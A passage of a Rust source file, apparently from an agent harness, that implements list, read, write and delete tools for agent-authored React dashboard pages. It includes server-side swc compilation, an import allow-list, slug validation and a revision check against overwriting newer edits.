//! Live create/read/write/delete tools over the company [`WorkspaceStore`],
//! scoped to `pages/<slug>/` — agent-authored internal dashboard pages.
//!
//! An agent's page is real React/TSX, compiled server-side: this repo's
//! runtime image has no Node (only the separate frontend Docker build stage
//! does), so turning `page.tsx` into something a browser can run has to be a
//! Rust-native step, done here inside [`PagesWriteTool::execute`] with
//! `swc_core`. See `docs/spec/runtime/pages.md` for the full design — the
//! `pages/<slug>/` convention, the compile contract, and the two halves of the
//! isolation story (server: CSP headers over trusted compiled output; client:
//! a sandboxed iframe, in `src/server/ops/pages.rs` and the frontend).
//!
//! # Shape, mirrored from [`crate::harness::workspace_tools`]
//!
//! One [`Tool`]-trait struct per operation, a shared company-scoped handle
//! ([`CompanyPages`]), and a [`pages_tools`] constructor. Four tools:
//!
//! * [`PagesListTool`] (`pages_list`) — every slug's [`PageManifest`].
//! * [`PagesReadTool`] (`pages_read`) — one slug's manifest and `page.tsx`
//!   source.
//! * [`PagesWriteTool`] (`pages_write`) — create or update a slug's manifest
//!   and/or source; a source write compiles it (see [`compile_page`]) and
//!   refuses the whole call, writing nothing, on a parse/transform error or a
//!   disallowed import.
//! * [`PagesDeleteTool`] (`pages_delete`) — remove a slug's whole bundle.
//!
//! # Why this is not `CompanyWorkspace` reused as-is
//!
//! `CompanyWorkspace` (`workspace_tools.rs`) is built around free-form
//! navigation of an arbitrary tree — a [`PathIndex`](workspace_tools) over
//! every node, `path` **or** `id` addressing, folders anywhere. A page bundle
//! is a fixed three-file shape (`page.toml`, `page.tsx`,
//! `page.compiled.mjs`) under one slug folder, so [`CompanyPages`] is a
//! smaller, purpose-built handle: it knows exactly one root
//! ([`PAGES_ROOT`]) and addresses everything by `slug`, never by a raw node
//! id an agent could otherwise pass for any node in the company's tree.
//!
//! # Why no separate read/write grant split
//!
//! Per the design, `pages` rides the default `"*"` grant whole — unlike
//! `workspace`, there is no `pages.write` half held back behind an explicit
//! grant. [`pages_tools`] therefore always returns all four tools; the only
//! gate is the namespace grant itself, applied one layer up in
//! [`crate::harness::build::build_agent`].

use std::sync::Arc;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

use oh::tools::traits::{PermissionLevel, Tool, ToolResult};
use openhuman_core::openhuman as oh;

// The workspace layout — `pages/<slug>/{page.toml,page.tsx,page.compiled.mjs}`
// — is shared with `crate::server::ops::pages`, which is always compiled and
// therefore cannot import from this `openhuman`-gated module. Both sides
// import the same constants from `workspace_scaffold` instead.
use crate::company::workspace_scaffold::{
    PAGE_COMPILED_MIME as COMPILED_MIME, PAGE_COMPILED_NAME as COMPILED_NAME,
    PAGE_MANIFEST_NAME as MANIFEST_NAME, PAGE_SOURCE_NAME as SOURCE_NAME, PAGES_ROOT,
};
use crate::harness::build::TOOL_RESULT_BUDGET_BYTES;
use crate::harness::workspace_tools::store_reason;
use crate::ports::types::CompanyId;
use crate::ports::workspace::{
    FolderClaim, NodeKind, WorkspaceNode, WorkspaceOrigin, WorkspaceStore,
};

/// Tool name: list every page's manifest.
pub const PAGES_LIST_TOOL: &str = "pages_list";
/// Tool name: read one page's manifest and source.
pub const PAGES_READ_TOOL: &str = "pages_read";
/// Tool name: create or update one page.
pub const PAGES_WRITE_TOOL: &str = "pages_write";
/// Tool name: remove one page.
pub const PAGES_DELETE_TOOL: &str = "pages_delete";

/// Headroom reserved out of [`TOOL_RESULT_BUDGET_BYTES`] for `pages_read`'s
/// preamble and its `--- BEGIN/END page.tsx ---` fences, mirroring the
/// `workspace_tools` read-overhead convention.
const READ_OVERHEAD_BYTES: usize = 1024;

/// Max bytes of `page.tsx` source one `pages_write` call accepts.
///
/// A page's source is read back whole for the next edit turn the same way a
/// workspace note is, so the same "a write must stay a write the agent can
/// read back in full" invariant applies — the compiled CAS edit loop this
/// module is built around breaks if a written page is too large for
/// [`pages_read`](PagesReadTool) to return whole under the harness's
/// per-tool-result budget. Sized against [`TOOL_RESULT_BUDGET_BYTES`] minus
/// read overhead, not a page's theoretical shape as a UI component, precisely
/// so the ceiling and the budget can never drift apart.
const MAX_SOURCE_BYTES: usize = TOOL_RESULT_BUDGET_BYTES - READ_OVERHEAD_BYTES;

const _: () = assert!(MAX_SOURCE_BYTES + READ_OVERHEAD_BYTES <= TOOL_RESULT_BUDGET_BYTES);

/// A slug: the path segment naming one page, `pages/<slug>/`.
///
/// Validated once, at the top of every tool — not reused from
/// [`crate::company::workspace_paths`], because a page slug is a narrower
/// shape than a general workspace path segment: it is also a URL path segment
/// ([`crate::server::ops::pages`]) and an import-map-free identifier, so it is
/// restricted to `^[a-z0-9][a-z0-9-]*$` rather than every character a
/// workspace node name otherwise allows.
fn valid_slug(slug: &str) -> bool {
    let mut chars = slug.chars();
    match chars.next() {
        Some(c) if c.is_ascii_lowercase() || c.is_ascii_digit() => {}
        _ => return false,
    }
    chars.all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
}

/// A page's small manifest — `page.toml` inside its folder.
///
/// Parsed and serialized with `toml`, matching the derive style used by
/// `src/company/types.rs`'s manifest types.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct PageManifest {
    /// The page's display title, shown in the console nav.
    pub title: String,
    /// One line describing what the page shows, if the agent gave one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    /// An icon token for the console nav, if the agent gave one.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub icon: Option<String>,
    /// Whether this page appears in the console nav. Defaults to `true` —
    /// most pages should default to visible, and hiding one is the
    /// exceptional case an agent opts into deliberately.
    #[serde(default = "default_nav_visible")]
    pub nav_visible: bool,
}

fn default_nav_visible() -> bool {
    true
}

impl Default for PageManifest {
    fn default() -> Self {
        Self {
            title: String::new(),
            description: None,
            icon: None,
            nav_visible: true,
        }
    }
}

// ---------------------------------------------------------------------------
// Compilation (issue: agent-authored dashboard pages, plan §2)
// ---------------------------------------------------------------------------

/// The bare import specifiers a `page.tsx` may reference.
///
/// Anything else fails [`compile_page`] before any transform runs — this is a
/// compile-time allow-list on the parsed `ImportDecl`s, not a sandbox
/// concern; the runtime isolation is the iframe sandbox described in
/// `docs/spec/runtime/pages.md`.
pub const ALLOWED_IMPORTS: &[&str] = &[
    "react",
    "react-dom/client",
    "react/jsx-runtime",
    "@opencompany/site",
];

/// The result of compiling one `page.tsx`.
#[derive(Debug)]
pub struct CompiledPage {
    /// The rendered ES module, ready to serve as `page.compiled.mjs`.
    pub code: String,
}

/// Parses `source` as TSX, strips TypeScript, transforms JSX via the
/// automatic runtime (importing `jsx`/`jsxs` from `"react/jsx-runtime"`), and
/// renders the result back to JS text.
///
/// Returns `Err` with a compiler diagnostic — never a panic — on a parse
/// error, an unsupported construct, or an import outside
/// [`ALLOWED_IMPORTS`]. The import check runs on the parsed AST **before**
/// any transform, so a rejected import is reported against the source the
/// agent wrote, not against transformed output it never saw.
pub fn compile_page(source: &str) -> Result<CompiledPage, String> {
    use swc_core::common::comments::NoopComments;
    use swc_core::common::sync::Lrc;
    use swc_core::common::{FileName, GLOBALS, Mark, SourceMap};
    use swc_core::ecma::ast::{EsVersion, Program};
    use swc_core::ecma::codegen::text_writer::JsWriter;
    use swc_core::ecma::codegen::{Config as CodegenConfig, Emitter};
    use swc_core::ecma::parser::lexer::Lexer;
    use swc_core::ecma::parser::{Parser, StringInput, Syntax, TsSyntax};
    use swc_core::ecma::transforms::base::resolver;
    use swc_core::ecma::transforms::react::{Options as ReactOptions, Runtime, react};
    use swc_core::ecma::transforms::typescript::strip;

    let cm: Lrc<SourceMap> = Default::default();
    let fm = cm.new_source_file(
        Lrc::new(FileName::Custom(SOURCE_NAME.to_string())),
        source.to_string(),
    );

    let syntax = Syntax::Typescript(TsSyntax {
        tsx: true,
        ..Default::default()
    });
    let lexer = Lexer::new(syntax, EsVersion::latest(), StringInput::from(&*fm), None);
    let mut parser = Parser::new_from(lexer);

    let module = parser
        .parse_module()
        .map_err(|e| format!("{:?}", e.into_kind()))?;
    let parse_errors = parser.take_errors();
    if !parse_errors.is_empty() {
        return Err(parse_errors
            .into_iter()
            .map(|e| format!("{:?}", e.into_kind()))
            .collect::<Vec<_>>()
            .join("\n"));
    }

    reject_disallowed_imports(&module)?;

    let mut program = Program::Module(module);
    GLOBALS.set(&Default::default(), || {
        let unresolved_mark = Mark::new();
        let top_level_mark = Mark::new();
        program.mutate(resolver(unresolved_mark, top_level_mark, true));
        program.mutate(strip(unresolved_mark, top_level_mark));
        program.mutate(react(
            cm.clone(),
            None::<NoopComments>,
            ReactOptions {
                runtime: Some(Runtime::Automatic),
                ..Default::default()
            },
            top_level_mark,
            unresolved_mark,
        ));
    });

    let mut buf = Vec::new();
    {
        let writer = JsWriter::new(cm.clone(), "\n", &mut buf, None);
        let mut emitter = Emitter {
            cfg: CodegenConfig::default(),
            cm: cm.clone(),
            comments: None,
            wr: writer,
        };
        emitter
            .emit_program(&program)
            .map_err(|e| format!("could not render compiled output: {e}"))?;
    }
    let code = String::from_utf8(buf).map_err(|e| format!("compiled output was not UTF-8: {e}"))?;

    Ok(CompiledPage { code })
}

/// Refuses `module` if any import/re-export names a specifier outside
/// [`ALLOWED_IMPORTS`]. Runs on the freshly parsed AST, before any transform.
///
/// This is a full AST walk, not just the top-level `ImportDecl`s: it also
/// rejects `export * from "…"`, `export { x } from "…"`, and dynamic
/// `import("…")` — all of which carry a specifier the browser would otherwise
/// fetch outside the served import map, so the allow-list would be a lie if it
/// only looked at static top-level imports.
fn reject_disallowed_imports(module: &swc_core::ecma::ast::Module) -> Result<(), String> {
    use swc_core::ecma::ast::{CallExpr, Callee, ExportAll, ImportDecl, NamedExport};
    use swc_core::ecma::visit::{Visit, VisitWith};

    struct PageImportCheck<'a> {
        allowed: &'a [&'a str],
        disallowed: Option<String>,
    }

    impl Visit for PageImportCheck<'_> {
        fn visit_import_decl(&mut self, n: &ImportDecl) {
            Self::note(
                &mut self.disallowed,
                self.allowed,
                n.src.value.as_str().unwrap_or(""),
                None,
            );
        }

        fn visit_export_all(&mut self, n: &ExportAll) {
            Self::note(
                &mut self.disallowed,
                self.allowed,
                n.src.value.as_str().unwrap_or(""),
                Some("via `export * from`"),
            );
        }

        fn visit_named_export(&mut self, n: &NamedExport) {
            if let Some(src) = &n.src {
                Self::note(
                    &mut self.disallowed,
                    self.allowed,
                    src.value.as_str().unwrap_or(""),
                    Some("via `export … from`"),
                );
            }
        }

        fn visit_call_expr(&mut self, n: &CallExpr) {
            if matches!(n.callee, Callee::Import(_)) && self.disallowed.is_none() {
                let spec = match n.args.first() {
                    Some(spread) => match &*spread.expr {
                        swc_core::ecma::ast::Expr::Lit(swc_core::ecma::ast::Lit::Str(s)) => {
                            s.value.as_str().unwrap_or("bad-dynamic-import").to_string()
                        }
                        _ => "a dynamic `import(…)`".to_string(),
                    },
                    None => "a dynamic `import(…)`".to_string(),
                };
                self.disallowed = Some(spec);
            }
            n.visit_children_with(self);
        }
    }

    impl PageImportCheck<'_> {
        fn note(disallowed: &mut Option<String>, allowed: &[&str], spec: &str, how: Option<&str>) {
            if disallowed.is_some() || allowed.contains(&spec) {
                return;
            }
            let how = how.map(|h| format!(" {h}")).unwrap_or_default();
            *disallowed = Some(format!("\"{spec}\"{how}"));
        }
    }

    let mut check = PageImportCheck {
        allowed: ALLOWED_IMPORTS,
        disallowed: None,
    };
    module.visit_with(&mut check);

    match check.disallowed {
        None => Ok(()),
        Some(spec) => Err(format!(
            "{spec} is not allowed in a dashboard page. Only {allowed} may be imported.",
            allowed = ALLOWED_IMPORTS
                .iter()
                .map(|s| format!("\"{s}\""))
                .collect::<Vec<_>>()
                .join(", "),
        )),
    }
}

// ---------------------------------------------------------------------------
// The company-scoped handle
// ---------------------------------------------------------------------------

/// A [`WorkspaceStore`] pinned to one company and one agent, scoped to
/// `pages/` — the object every tool in this module holds.
///
/// `company` and `agent_id` are fixed at build time and never derived from a
/// tool argument, the same tenancy argument [`crate::harness::workspace_tools`]
/// makes for `CompanyWorkspace`: every lookup here starts from
/// [`CompanyPages::slug_children`], which reads this company's own tree, so a
/// slug an agent invents can only ever resolve inside this company's `pages/`
/// subtree.
#[derive(Clone)]
pub struct CompanyPages {
    store: Arc<dyn WorkspaceStore>,
    company: CompanyId,
    agent_id: String,
}

/// A page's three nodes, resolved by slug — whichever of the three exist.
#[derive(Default)]
struct PageBundle {
    folder_id: Option<String>,
    manifest: Option<WorkspaceNode>,
    source: Option<WorkspaceNode>,
    compiled: Option<WorkspaceNode>,
}

impl CompanyPages {
    /// Pin `store` to `company`, writing as `agent_id`.
    pub fn new(store: Arc<dyn WorkspaceStore>, company: CompanyId, agent_id: String) -> Self {
        Self {
            store,
            company,
            agent_id,
        }
    }

    fn origin(&self) -> WorkspaceOrigin {
        WorkspaceOrigin::Agent {
            id: self.agent_id.clone(),
        }
    }

    /// Every slug folder directly under [`PAGES_ROOT`], with its bundle
    /// resolved from a single company-scoped tree read.
    async fn all_pages(&self) -> crate::Result<Vec<(String, PageBundle)>> {
        let nodes = self.store.tree(&self.company).await?;
        // Case-insensitive on all four names, and for one reason: the root and
        // the two source files were `pages/`, `page.tsx` and `page.compiled.mjs`
        // before the workspace's lowercase-dashed rule
        // ([`crate::company::workspace_names`]). A company created then still
        // carries them, and an exact match would report every one of its pages
        // as missing while they sit in the tree.
        let pages_root = nodes.iter().find(|n| {
            n.parent_id.is_none()
                && n.kind == NodeKind::Folder
                && n.name.eq_ignore_ascii_case(PAGES_ROOT)
        });
        let Some(pages_root) = pages_root else {
            return Ok(Vec::new());
        };
        let slug_folders: Vec<&WorkspaceNode> = nodes
            .iter()
            .filter(|n| {
                n.kind == NodeKind::Folder && n.parent_id.as_deref() == Some(pages_root.id.as_str())
            })
            .collect();

        let mut out = Vec::new();
        for folder in slug_folders {
            let mut bundle = PageBundle {
                folder_id: Some(folder.id.clone()),
                ..Default::default()
            };
            for child in nodes
                .iter()
                .filter(|n| n.parent_id.as_deref() == Some(folder.id.as_str()))
            {
                let name = child.name.as_str();
                if name.eq_ignore_ascii_case(MANIFEST_NAME) {
                    bundle.manifest = Some(child.clone());
                } else if name.eq_ignore_ascii_case(SOURCE_NAME) {
                    bundle.source = Some(child.clone());
                } else if name.eq_ignore_ascii_case(COMPILED_NAME) {
                    bundle.compiled = Some(child.clone());
                }
            }
            out.push((folder.name.clone(), bundle));
        }
        out.sort_by(|a, b| a.0.cmp(&b.0));
        Ok(out)
    }

    /// Resolves one slug's bundle, or `None` if the slug has no folder yet.
    async fn page(&self, slug: &str) -> crate::Result<Option<PageBundle>> {
        Ok(self
            .all_pages()
            .await?
            .into_iter()
            .find(|(name, _)| name == slug)
            .map(|(_, bundle)| bundle))
    }

    /// Claims `pages/<slug>/`, creating `pages/` first if this is the first
    /// page — mirrors [`crate::company::workspace_scaffold::ensure_agent_folder`]'s
    /// on-demand-root pattern for `agents/`.
    async fn ensure_slug_folder(&self, slug: &str) -> crate::Result<String> {
        // A legacy `Pages/` root is adopted rather than joined by a lowercase
        // twin — the same call the scaffold makes for `agents/`, and made
        // through the scaffold's own resolver so the two cannot drift.
        let nodes = self.store.tree(&self.company).await?;
        let pages_root = match crate::company::workspace_scaffold::find(&nodes, None, PAGES_ROOT) {
            crate::company::workspace_scaffold::Found::Folder(id) => id,
            crate::company::workspace_scaffold::Found::Collision(why) => {
                return Err(crate::error::OpenCompanyError::Conflict(why));
            }
            crate::company::workspace_scaffold::Found::Free => {
                self.store
                    .adopt_or_create_folder(&self.company, None, PAGES_ROOT, self.origin())
                    .await?
                    .into_node()
                    .id
            }
        };
        let claim: FolderClaim = self
            .store
            .adopt_or_create_folder(&self.company, Some(&pages_root), slug, self.origin())
            .await?;
        Ok(claim.id().to_string())
    }

    /// Reads a manifest node's TOML body, falling back to the default when the
    /// node is absent or fails to parse — a slug with a source but no manifest
    /// (or a manifest a hand-edit corrupted) should still list and read rather
    /// than error, since a title default of the slug itself is always a valid
    /// answer.
    async fn read_manifest(&self, node: &WorkspaceNode, fallback_title: &str) -> PageManifest {
        match self.store.read(&self.company, &node.id).await {
            Ok(Some((_, body))) => toml::from_str(&body).unwrap_or_else(|_| PageManifest {
                title: fallback_title.to_string(),
                ..Default::default()
            }),
            _ => PageManifest {
                title: fallback_title.to_string(),
                ..Default::default()
            },
        }
    }
}

// ---------------------------------------------------------------------------
// pages_list
// ---------------------------------------------------------------------------

/// Lists every page's manifest. Read-only.
pub struct PagesListTool {
    pages: CompanyPages,
}

impl PagesListTool {
    fn new(pages: CompanyPages) -> Self {
        Self { pages }
    }
}

#[async_trait]
impl Tool for PagesListTool {
    fn name(&self) -> &str {
        PAGES_LIST_TOOL
    }

    fn description(&self) -> &str {
        "List every internal dashboard page the company has, with its title, description, icon \
         and nav visibility. USE FOR seeing what pages already exist before creating a new one or \
         picking one to edit."
    }

    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {},
            "additionalProperties": false
        })
    }

    fn permission_level(&self) -> PermissionLevel {
        PermissionLevel::ReadOnly
    }

    async fn execute(&self, _args: Value) -> anyhow::Result<ToolResult> {
        let pages = match self.pages.all_pages().await {
            Ok(pages) => pages,
            Err(e) => {
                return Ok(ToolResult::error(format!(
                    "Could not list the company's pages: {reason}.",
                    reason = store_reason(&e),
                )));
            }
        };

        if pages.is_empty() {
            return Ok(ToolResult::success(
                "The company has no dashboard pages yet. Create one with `pages_write`."
                    .to_string(),
            ));
        }

        let mut out = format!("{} dashboard page(s):\n", pages.len());
        for (slug, bundle) in &pages {
            let manifest = match &bundle.manifest {
                Some(node) => self.pages.read_manifest(node, slug).await,
                None => PageManifest {
                    title: slug.clone(),
                    ..Default::default()
                },
            };
            out.push_str(&format!(
                "- {slug}: \"{title}\"{desc}{icon}{hidden}\n",
                desc = manifest
                    .description
                    .as_deref()
                    .map(|d| format!(" — {d}"))
                    .unwrap_or_default(),
                icon = manifest
                    .icon
                    .as_deref()
                    .map(|i| format!(" [icon={i}]"))
                    .unwrap_or_default(),
                hidden = if manifest.nav_visible {
                    ""
                } else {
                    " (hidden from nav)"
                },
                title = manifest.title,
            ));
        }
        Ok(ToolResult::success(out))
    }
}

// ---------------------------------------------------------------------------
// pages_read
// ---------------------------------------------------------------------------

/// Reads one page's manifest and `page.tsx` source. Read-only.
pub struct PagesReadTool {
    pages: CompanyPages,
}

impl PagesReadTool {
    fn new(pages: CompanyPages) -> Self {
        Self { pages }
    }
}

#[async_trait]
impl Tool for PagesReadTool {
    fn name(&self) -> &str {
        PAGES_READ_TOOL
    }

    fn description(&self) -> &str {
        "Read one dashboard page's manifest (title, description, icon, nav visibility) and its \
         `page.tsx` source, by `slug`. USE FOR reviewing or revising a page you or a teammate \
         already built."
    }

    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "slug": {
                    "type": "string",
                    "description": "The page's slug, as shown by pages_list, e.g. \"revenue-overview\"."
                }
            },
            "required": ["slug"],
            "additionalProperties": false
        })
    }

    fn permission_level(&self) -> PermissionLevel {
        PermissionLevel::ReadOnly
    }

    async fn execute(&self, args: Value) -> anyhow::Result<ToolResult> {
        let Some(slug) = args.get("slug").and_then(Value::as_str).map(str::trim) else {
            return Ok(ToolResult::error(
                "Invalid arguments: `slug` is required.".to_string(),
            ));
        };
        if !valid_slug(slug) {
            return Ok(ToolResult::error(format!(
                "Invalid `slug`: \"{slug}\" — a slug must start with a lowercase letter or digit \
                 and contain only lowercase letters, digits and hyphens."
            )));
        }

        let bundle = match self.pages.page(slug).await {
            Ok(bundle) => bundle,
            Err(e) => {
                return Ok(ToolResult::error(format!(
                    "Could not read the page `{slug}`: {reason}.",
                    reason = store_reason(&e),
                )));
            }
        };
        let Some(bundle) = bundle else {
            return Ok(ToolResult::error(format!(
                "No page named `{slug}`. Call `{PAGES_LIST_TOOL}` to see what exists."
            )));
        };

        let manifest = match &bundle.manifest {
            Some(node) => self.pages.read_manifest(node, slug).await,
            None => PageManifest {
                title: slug.to_string(),
                ..Default::default()
            },
        };

        let mut out = format!(
            "Page `{slug}`: title=\"{title}\"{desc}{icon}, nav_visible={visible}\n",
            title = manifest.title,
            desc = manifest
                .description
                .as_deref()
                .map(|d| format!(", description=\"{d}\""))
                .unwrap_or_default(),
            icon = manifest
                .icon
                .as_deref()
                .map(|i| format!(", icon=\"{i}\""))
                .unwrap_or_default(),
            visible = manifest.nav_visible,
        );

        match &bundle.source {
            Some(node) => match self.pages.store.read(&self.pages.company, &node.id).await {
                Ok(Some((node, body))) => {
                    out.push_str(&format!(
                        "Source rev={rev}. To revise it, call `{PAGES_WRITE_TOOL}` with \
                         expected_updated_at={rev} and the complete new source.\n--- BEGIN \
                         page.tsx ---\n",
                        rev = node.updated_at_millis
                    ));
                    out.push_str(&body);
                    out.push_str("\n--- END page.tsx ---\n");
                }
                _ => out.push_str("Its `page.tsx` could not be read.\n"),
            },
            None => {
                out.push_str("This page has no `page.tsx` yet — write one with `pages_write`.\n")
            }
        }

        Ok(ToolResult::success(out))
    }
}

// ---------------------------------------------------------------------------
// pages_write
// ---------------------------------------------------------------------------

/// Creates or updates one page's manifest and/or `page.tsx` source. A source
/// write compiles it via [`compile_page`] and writes `page.compiled.mjs`
/// alongside it; a compile failure writes nothing.
pub struct PagesWriteTool {
    pages: CompanyPages,
}

impl PagesWriteTool {
    fn new(pages: CompanyPages) -> Self {
        Self { pages }
    }
}

#[async_trait]
impl Tool for PagesWriteTool {
    fn name(&self) -> &str {
        PAGES_WRITE_TOOL
    }

    fn description(&self) -> &str {
        "Create or update one internal dashboard page, by `slug`. Pass `source` (the complete new \
         `page.tsx` body) to (re)compile the page — a page importing anything other than \"react\", \
         \"react-dom/client\", \"react/jsx-runtime\" or \"@opencompany/site\" is refused, and a \
         compile error is returned verbatim so you can fix it. Pass `title` (required on first \
         write) and optionally `description`, `icon`, `nav_visible` to set the manifest. When \
         updating an EXISTING source, `expected_updated_at` (the `rev` from `pages_read`) is \
         required, so a page edited since you read it is not silently overwritten."
    }

    fn parameters_schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "slug": {
                    "type": "string",
                    "description": "The page's slug, e.g. \"revenue-overview\". Lowercase letters, digits and hyphens only; must start with a letter or digit."
                },
                "title": {
                    "type": "string",
                    "description": "The page's display title. Required the first time a page is created."
                },
                "description": {
                    "type": "string",
                    "description": "One line describing what the page shows."
                },
                "icon": {
                    "type": "string",
                    "description": "An icon token for the console nav."
                },
                "nav_visible": {
                    "type": "boolean",
                    "description": "Whether the page appears in the console nav. Defaults to true."
                },
                "source": {
                    "type": "string",
                    "description": "The complete new page.tsx body. Omit to change only the manifest."
                },
                "expected_updated_at": {
                    "type": "integer",
                    "description": "Required when `source` is given and the page already has a page.tsx — the `rev` from pages_read."
                }
            },
            "required": ["slug"],
            "additionalProperties": false
        })
    }

    fn permission_level(&self) -> PermissionLevel {
        PermissionLevel::Write
    }

    async fn execute(&self, args: Value) -> anyhow::Result<ToolResult> {
        let Some(slug) = args.get("slug").and_then(Value::as_str).map(str::trim) else {
            return Ok(ToolResult::error(
                "Invalid arguments: `slug` is required.".to_string(),
            ));
        };
        if !valid_slug(slug) {
            return Ok(ToolResult::error(format!(
                "Invalid `slug`: \"{slug}\" — a slug must start with a lowercase letter or digit \
                 and contain only lowercase letters, digits and hyphens."
            )));
        }

        let source = args.get("source").and_then(Value::as_str);
        if let Some(source) = source
            && source.len() > MAX_SOURCE_BYTES
        {
            return Ok(ToolResult::error(format!(
                "Refused: the source is {} bytes, over the {MAX_SOURCE_BYTES}-byte limit for a \
                 page.",
                source.len()
            )));
        }

        let existing = match self.pages.page(slug).await {
            Ok(bundle) => bundle,
            Err(e) => {
                return Ok(ToolResult::error(format!(
                    "Could not read the page `{slug}`: {reason}.",
                    reason = store_reason(&e),
                )));
            }
        };

        // CAS guard, mirroring `workspace_write`: required whenever a source
        // that already exists is being replaced, so a page edited since the
        // agent last read it is refused rather than clobbered. A brand-new
        // page (no existing `page.tsx`) has no revision to guard against.
        if source.is_some()
            && let Some(existing_source) = existing.as_ref().and_then(|b| b.source.as_ref())
        {
            let expected = args.get("expected_updated_at").and_then(|value| {
                value
                    .as_u64()
                    .or_else(|| value.as_str().and_then(|s| s.trim().parse::<u64>().ok()))
            });
            let Some(expected) = expected else {
                return Ok(ToolResult::error(format!(
                    "Invalid arguments: `expected_updated_at` is required to overwrite an \
                     existing page's source. Call `{PAGES_READ_TOOL}` on `{slug}` first and pass \
                     back the `rev` it reports."
                )));
            };
            if expected != existing_source.updated_at_millis {
                return Ok(ToolResult::error(format!(
                    "Refused: `{slug}`'s source changed since you read it — you passed \
                     expected_updated_at={expected}, but its current revision is {current}. \
                     Re-read it with `{PAGES_READ_TOOL}` and re-apply your change.",
                    current = existing_source.updated_at_millis,
                )));
            }
        }

        // Compile BEFORE anything is written — a rejected import or a parse
        // error must leave the page exactly as it was (plan §2). The compile
        // is a full swc parse/transform/codegen over up to `MAX_SOURCE_BYTES`
        // of agent input — CPU-bound work that would otherwise occupy a tokio
        // worker for its whole duration — so it runs on the blocking pool
        // rather than inline in this async handler. The `spawn_blocking`
        // closure owns its own copy of the source, so nothing from `args` is
        // borrowed across the `await`.
        let compiled = match source {
            Some(source) => {
                let owned = source.to_string();
                match tokio::task::spawn_blocking(move || compile_page(&owned)).await {
                    Ok(Ok(compiled)) => Some(compiled),
                    Ok(Err(diagnostic)) => {
                        return Ok(ToolResult::error(format!(
                            "Could not compile `{slug}`'s page.tsx — nothing was written:\n\n\
                             {diagnostic}"
                        )));
                    }
                    Err(e) => {
                        return Ok(ToolResult::error(format!(
                            "Could not compile `{slug}`'s page.tsx — the compiler task failed: \
                             {e}"
                        )));
                    }
                }
            }
            None => None,
        };

        // Resolve the manifest to write: an explicit field overrides, an
        // omitted field keeps the existing manifest's value, and a
        // brand-new page needs `title`.
        let existing_manifest = match existing.as_ref().and_then(|b| b.manifest.as_ref()) {
            Some(node) => Some(self.pages.read_manifest(node, slug).await),
            None => None,
        };
        let title = args
            .get("title")
            .and_then(Value::as_str)
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_string)
            .or_else(|| existing_manifest.as_ref().map(|m| m.title.clone()));
        let Some(title) = title else {
            return Ok(ToolResult::error(
                "Invalid arguments: `title` is required the first time a page is created."
                    .to_string(),
            ));
        };
        let description = args
            .get("description")
            .and_then(Value::as_str)
            .map(str::to_string)
            .or_else(|| {
                existing_manifest
                    .as_ref()
                    .and_then(|m| m.description.clone())
            });
        let icon = args
            .get("icon")
            .and_then(Value::as_str)
            .map(str::to_string)
            .or_else(|| existing_manifest.as_ref().and_then(|m| m.icon.clone()));
        let nav_visible = args
            .get("nav_visible")
            .and_then(Value::as_bool)
            .unwrap_or_else(|| {
                existing_manifest
                    .as_ref()
                    .map(|m| m.nav_visible)
                    .unwrap_or(true)
            });
        let manifest = PageManifest {
            title,
            description,
            icon,
            nav_visible,
        };
        let manifest_toml = match toml::to_string_pretty(&manifest) {
            Ok(s) => s,
            Err(e) => {
                return Ok(ToolResult::error(format!(
                    "Could not serialize the page manifest: {e}."
                )));
            }
        };

        let folder_id = match self.pages.ensure_slug_folder(slug).await {
            Ok(id) => id,
            Err(e) => {
                return Ok(ToolResult::error(format!(
                    "Could not create the page folder for `{slug}`: {reason}.",
                    reason = store_reason(&e),
                )));
            }
        };
        let origin = self.pages.origin();

        // Manifest: write over the existing node, or create it.
        if let Err(e) = self
            .pages
            .write_or_create_text(
                &folder_id,
                existing.as_ref().and_then(|b| b.manifest.clone()),
                MANIFEST_NAME,
                &manifest_toml,
                origin.clone(),
            )
            .await
        {
            return Ok(ToolResult::error(format!(
                "Could not save `{slug}`'s manifest: {reason}.",
                reason = store_reason(&e),
            )));
        }

        // Source + compiled output, only when `source` was given.
        if let (Some(source), Some(compiled)) = (source, compiled) {
            if let Err(e) = self
                .pages
                .write_or_create_text(
                    &folder_id,
                    existing.as_ref().and_then(|b| b.source.clone()),
                    SOURCE_NAME,
                    source,
                    origin.clone(),
                )
                .await
            {
                return Ok(ToolResult::error(format!(
                    "Could not save `{slug}`'s page.tsx: {reason}.",
                    reason = store_reason(&e),
                )));
            }
            if let Err(e) = self
                .pages
                .write_or_create_binary(
                    &folder_id,
                    existing.as_ref().and_then(|b| b.compiled.clone()),
                    COMPILED_NAME,
                    compiled.code.as_bytes(),
                    origin,
                )
                .await
            {
                return Ok(ToolResult::error(format!(
                    "Saved `{slug}`'s page.tsx but could not save the compiled bundle: \
                     {reason}. The page will not serve correctly until this is retried.",
                    reason = store_reason(&e),
                )));
            }
        }

        Ok(ToolResult::success(format!(
            "Saved page `{slug}` (\"{title}\"). {compiled_note}View it at {{scope}}/pages/{slug} \
             in the console once the operator opens it.",
            title = manifest.title,
            compiled_note = if source.is_some() {
                "Compiled successfully. "
            } else {
                ""
            },
        )))
    }
}

impl CompanyPages {
    /// Writes `content` over `existing`, or creates a fresh text node named
    /// `name` under `parent_id` when there is none yet.
    async fn write_or_create_text(
        &self,
        parent_id: &str,
        existing: Option<WorkspaceNode>,
        name: &str,
        content: &str,
        origin: WorkspaceOrigin,
    ) -> crate::Result<()> {
        match existing {
            Some(node) => {
                self.store
                    .write(&self.company, &node.id, content, origin)
                    .await?;
                Ok(())
            }
            None => {
                let node = WorkspaceNode {
                    id: crate::ports::generate_id(),
                    name: name.to_string(),
                    kind: NodeKind::File,
                    parent_id: Some(parent_id.to_string()),
                    updated_at_millis: crate::ports::now_millis(),
                    created_by: origin.clone(),
                    updated_by: origin,
                    mime: None,
                    size: None,
                    sha256: None,
                    adopted: false,
                };
                self.store.create(&self.company, &node, Some(content)).await
            }
        }
    }

    /// Writes `bytes` over `existing`'s binary payload, or creates a fresh
